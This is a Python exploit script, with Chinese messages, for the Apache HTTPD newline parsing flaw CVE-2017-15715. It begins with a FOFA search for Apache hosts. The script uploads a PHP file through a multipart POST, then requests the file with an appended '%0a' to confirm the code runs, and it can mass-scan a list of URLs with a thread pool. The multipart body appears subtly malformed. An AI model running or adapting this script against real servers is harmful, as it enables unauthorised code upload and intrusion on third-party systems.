#FOFA: body="Apache"

import requests
import re
import argparse
import urllib3
import urllib
from urllib.parse import urlparse
from multiprocessing.dummy import Pool
import random
import string
import json
import time

urllib3.disable_warnings()

proxy = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def banner():
    info = """
   _____                __          __        _        _                 
  / ____|               \ \        / /       | |      | |                
 | |  __ _ __ __ _ ___ __\ \  /\  / /__  _ __| | _____| |__   ___  _ __  
 | | |_ | '__/ _` / __/ __\ \/  \/ / _ \| '__| |/ / __| '_ \ / _ \| '_ \ 
 | |__| | | | (_| \__ \__ \\  /\  / (_) | |  |   <\__ \ | | | (_) | |_) |
  \_____|_|  \__,_|___/___/ \/  \/ \___/|_|  |_|\_\___/_| |_|\___/| .__/ 
                                                                  | |    
                                                                  |_|    
"""
    print(info)

def poc(target):
    result = {
        'name': 'Apache HTTPD 换行解析漏洞（CVE-2017-15715）',
        'vulnerable': False
    }
    filename = '/testing.php%0a'

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0',
        'Content-Type': 'multipart/form-data; boundary=---------------------------153388130435749919031880185481'
    }

    data = '''-----------------------------153388130435749919031880185481
    Content-Disposition: form-data; name="file"; filename="testing.php"
    Content-Type: application/octet-stream

    <?php phpinfo(); ?>

    -----------------------------153388130435749919031880185481
    Content-Disposition: form-data; name="name"

    testing.php

    -----------------------------153388130435749919031880185481--'''

    try:
        respond = requests.post(target, headers=headers, data=data, timeout=3)
        v = requests.get(target + filename, timeout=3)
        if respond.status_code == 200 and re.search('PHP Version', v.text) and v.status_code == 200:
            result['vulnerable'] = True
            result['url'] = target
            result['verify'] = target + filename
            print(result)
        else:
            print(f"{target}不存在漏洞")
    except:
        print(f"{target}访问失败")


def main():
    parser = argparse.ArgumentParser("Apache HTTPD 换行解析漏洞检测POC")
    parser.add_argument("-u", "--url", dest="url", help="Insert URL")
    parser.add_argument("-f", "--file", dest="file", help="Insert URLs file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r') as uf:
            urls = []
            for u in uf.readlines():
                urls.append(u.strip())
            mp = Pool(10)
            mp.map(poc, urls)
            mp.close()
            mp.join()
    else:
        print("输入有误，请检查")

if __name__ == '__main__':
    banner()
    main()